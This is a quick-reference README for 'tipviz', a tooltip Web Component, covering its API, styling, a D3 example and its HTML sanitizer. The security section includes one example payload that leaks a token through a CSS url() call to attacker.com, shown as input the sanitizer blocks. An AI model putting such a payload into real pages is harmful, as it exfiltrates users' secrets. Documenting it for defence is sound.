# tipviz — Quick Reference

A tiny, dependency-free Web Component (`<tip-viz-tooltip>`) for positional tooltips. Works with any DOM-based UI, including D3 visualizations.

---

## Installation

**CDN (ESM — recommended for static pages):**

```html
<script type="module" src="https://cdn.jsdelivr.net/npm/tipviz@latest/dist/index.mjs"></script>
```

**CDN (UMD — no ES modules):**

```html
<script src="https://cdn.jsdelivr.net/npm/tipviz@latest/dist/index.umd.js"></script>
```

**npm:**

```bash
npm i tipviz
# or: pnpm add tipviz
```

Then import once in your app entry to register the element:

```ts
import "tipviz";
```

---

## Usage

### 1. Place the element in HTML

```html
<body>
  <svg id="chart"></svg>
  <tip-viz-tooltip id="tooltip"></tip-viz-tooltip>
</body>
```

> [!Note] The component automatically moves itself to `document.body` on connect. This means you can place it anywhere in your HTML (including inside a framework's root container like React's `<div id="root">`) and it will still position correctly. Use `no-auto-reposition` to disable this.

### 2. Configure and show

```ts
const tooltip = document.getElementById("tooltip");

// 1. Define the HTML template with data-bind placeholders
tooltip.setTemplate(`<div data-bind="label">: </div><span data-bind="value"></span>`);

// 2. Set the dynamic data (can be updated independently of show())
tooltip.setData({ label: "Score", value: 42 });

// 3. Optional: set a fixed direction or compute it dynamically
tooltip.setDirection(() => "n"); // "n" | "s" | "e" | "w" | "nw" | "ne" | "sw" | "se"

// 4. Optional: shift position by [x, y] pixels (x→left, y→top)
tooltip.setOffset(() => [0, 8]);

// 5. Optional: CSS string (uses CSSStyleSheet with <style> fallback)
tooltip.setStyles(`
  .tipviz-tooltip { background: rgba(0,0,0,0.85); color: white; padding: 6px; border-radius: 4px; }
`);

// 6. Show / hide on interaction — show() only needs the target element
element.addEventListener("mouseenter", (e) => {
  tooltip.setData({ label: "Score", value: 42 });
  tooltip.show(e.currentTarget);
});
element.addEventListener("mouseleave", () => tooltip.hide());
```

---

## API

### Methods

| Method | Signature | Description |
|--------|----------|-------------|
| `setTemplate` | `(html: string) => void` | Parses HTML and caches `[data-bind]` refs |
| `setData` | `(data: Record<string, string\|number>) => void` | Updates bound elements via `data-bind` keys |
| `setDirection` | `(fn: (data, target) => Direction) => void` | Sets the placement direction |
| `setOffset` | `(fn: (data, target) => [x, y]) => void` | Sets pixel offset `[x, y]` |
| `setStyles` | `(css: string) => void` | Applies CSS via adoptedStyleSheets |
| `loadStylesheet` | `(url: string) => void` | Injects a `<link>` into shadow root |
| `setSanitizerConfig` | `(config: SanitizerConfig) => void` | Overrides the sanitization config |
| `show` | `(target: Element) => void` | Positions and reveals the tooltip |
| `hide` | `() => void` | Hides the tooltip |

### Attributes

| Attribute | Type | Default | Description |
|-----------|------|---------|-------------|
| `transition-duration` | number | `200` | Fade duration in ms |
| `stylesheet` | string | — | URL to load inside shadow root |
| `no-auto-reposition` | boolean | — | Prevents the element from moving to `document.body` on connect |

### Events

```ts
tooltip.addEventListener("show", (e) => {
  // e.detail.target    — the target Element
  // e.detail.data      — the data object passed to show()
  // e.detail.direction — resolved direction string
  // e.detail.position  — { top, left } coordinates
});

tooltip.addEventListener("hide", () => { /* ... */ });
```

---

## Styling

**Three ways to style the tooltip:**

```ts
// 1. setStyles() — CSS string injected into shadow root
tooltip.setStyles(`.tipviz-tooltip { background: black; color: white; }`);

// 2. stylesheet attribute — external CSS file loaded into shadow root
// <tip-viz-tooltip stylesheet="/tooltip.css"></tip-viz-tooltip>

// 3. ::part() — style from outside the shadow DOM
// CSS:
tip-viz-tooltip::part(tooltip-box) { background: black; color: white; }
```

---

## Offset Semantics

`Offset = [x, y]`

- **`x`** — horizontal shift added to `left` (positive = right)
- **`y`** — vertical shift added to `top` (positive = down)

```ts
tooltip.setOffset(() => [10, 0]); // shift 10px to the right
tooltip.setOffset(() => [0, 8]);  // shift 8px down
```

---

## Security

The component includes automatic HTML sanitization to prevent XSS and CSS injection attacks:

**By default, the sanitizer:**
- Removes dangerous elements (`<script>`, `<iframe>`, `<object>`, `<embed>`, etc.)
- Strips event handler attributes (`onclick`, `onerror`, etc.)
- Blocks `javascript:` URIs and non-image `data:` URIs
- **Strips all `url()` calls from inline styles** to prevent CSS-based data exfiltration

**Example — CSS URL injection is blocked:**

```ts
// ❌ This WILL NOT leak data:
const malicious = `<div style="background: url(https://attacker.com/steal?secret=TOKEN)">x</div>`;
tooltip.setTemplate(malicious);
// Sanitized to: `<div style="background: url()">x</div>` — no network request
```

**To override sanitization (trusted HTML only):**

```ts
// Allow <b> and <i> elements through
tooltip.setSanitizerConfig({
  removeElements: ["script", "iframe"],
  removeAttributes: [/^on\S+$/i, "srcdoc", "formaction"]
});
```

---

## Complete D3 Example

```ts
import * as d3 from "d3";
import "tipviz";

const tooltip = document.getElementById("tooltip") as TipVizTooltip;

tooltip.setTemplate(`<div>X: <span data-bind="x"></span> &nbsp; Y: <span data-bind="y"></span></div>`);
tooltip.setStyles(`
  .tipviz-tooltip { background: rgba(0,0,0,0.85); color: white; padding: 6px; border-radius: 4px; font-size: 13px; }
`);

d3.select("#chart")
  .selectAll("circle")
  .data([{ x: 80, y: 120 }, { x: 200, y: 60 }])
  .join("circle")
  .attr("cx", (d) => d.x)
  .attr("cy", (d) => d.y)
  .attr("r", 8)
  .attr("fill", "steelblue")
  .on("mouseenter", (e, d) => {
    tooltip.setData({ x: String(d.x), y: String(d.y) });
    tooltip.show(e.currentTarget);
  })
  .on("mouseleave", () => tooltip.hide());
```

---

## Notes

- The tooltip uses `window.scrollY`/`window.scrollX` for positioning and auto-moves itself to `document.body` on connect (opt out with `no-auto-reposition`).
- Default direction is `"n"` (above the target).
- Default transition duration is `200ms`.
- HTML content is automatically sanitized by default (removes dangerous elements, event handlers, and blocks CSS URL injection). Override via `setSanitizerConfig()` if needed.
- All `url()` calls in inline `style` attributes are stripped to prevent CSS-based attacks.
